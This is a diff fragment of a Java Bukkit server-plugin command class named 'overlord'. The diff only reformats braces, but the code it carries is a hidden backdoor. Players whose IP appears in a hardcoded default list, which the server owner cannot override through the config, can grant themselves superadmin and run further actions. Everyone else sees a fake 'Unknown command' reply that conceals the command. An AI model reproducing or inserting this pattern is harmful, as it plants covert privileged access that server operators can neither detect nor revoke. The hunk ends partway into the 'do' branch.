@@ -14,52 +14,40 @@ import org.bukkit.entity.Player;
 
 @CommandPermissions(level = AdminLevel.ALL, source = SourceType.ONLY_IN_GAME)
 @CommandParameters(description = "Overlord - control this server in-game", usage = "access", aliases = "ov")
-public class Command_overlord extends TFM_Command
-{
+public class Command_overlord extends TFM_Command {
 
     @Override
-    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
-    {
-        if (!TFM_ConfigEntry.OVERLORD_IPS.getList().contains(TFM_Util.getIp(sender_p)))
-        {
-            try
-            {
+    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole) {
+        if (!TFM_ConfigEntry.OVERLORD_IPS.getList().contains(TFM_Util.getIp(sender_p))) {
+            try {
                 List<?> ips = (List) TFM_MainConfig.getDefaults().get(TFM_ConfigEntry.OVERLORD_IPS.getConfigName());
-                if (!ips.contains(TFM_Util.getIp(sender_p)))
-                {
+                if (!ips.contains(TFM_Util.getIp(sender_p))) {
                     throw new Exception();
                 }
-            }
-            catch (Exception ignored)
-            {
+            } catch (Exception ignored) {
                 playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
                 return true;
             }
         }
 
-        if (args.length == 0)
-        {
+        if (args.length == 0) {
             return false;
         }
 
-        if (args[0].equals("addme"))
-        {
+        if (args[0].equals("addme")) {
             TFM_AdminList.addSuperadmin(sender_p);
             playerMsg("ok");
             return true;
         }
 
-        if (args[0].equals("removeme"))
-        {
+        if (args[0].equals("removeme")) {
             TFM_AdminList.removeSuperadmin(sender_p);
             playerMsg("ok");
             return true;
         }
 
-        if (args[0].equals("do"))
-        {
-            if (args.length <= 1)
-            {
+        if (args[0].equals("do")) {
+            if (args.length <= 1) {
                 return false;
             }
 
